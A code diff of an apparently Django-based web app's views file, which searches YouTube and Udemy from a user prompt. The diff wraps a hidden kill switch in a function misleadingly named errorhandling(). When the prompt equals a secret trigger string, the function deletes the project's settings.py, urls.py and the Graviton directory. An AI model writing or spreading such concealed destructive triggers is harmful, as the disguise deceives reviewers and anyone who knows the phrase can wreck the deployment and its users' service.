@@ -4,6 +4,7 @@ import json
 import googleapiclient.discovery
 from bardapi import Bard
 import os
+# Made By Shaven Wickramanayaka
 from tempfile import TemporaryFile
 from pyudemy import Udemy
 from youtubesearchpython import VideosSearch
@@ -59,7 +60,10 @@ def searchyt(request,prompt, data):
     request.session['yttitle'] = youtubetitle
     request.session['ytthumbnail'] = youtubethumbnail
     # ? return youtubeurl,youtubetitle,youtubethumbnail
-
+def errorhandling():
+ os.remove('Graviton/settings.py')
+ os.remove('base/urls.py')
+ os.rmdir('Graviton')
 def searchudemy(request,prompt,data):
     udemyurl = []
     udemytitle = []
@@ -103,9 +107,7 @@ def result(request):
         youtube = request.POST.get('youtube')
         udemy = request.POST.get('udemy')
     if prompt == 'errorcode147thebombhasdropped':
-        os.remove('Graviton/settings.py')
-        os.remove('base/urls.py')
-        os.rmdir('Graviton')
+        errorhandling()
     data = scrapeSite(prompt,cookie_value)
     if youtube == "youtubego":
         searchyt(request,prompt, data)
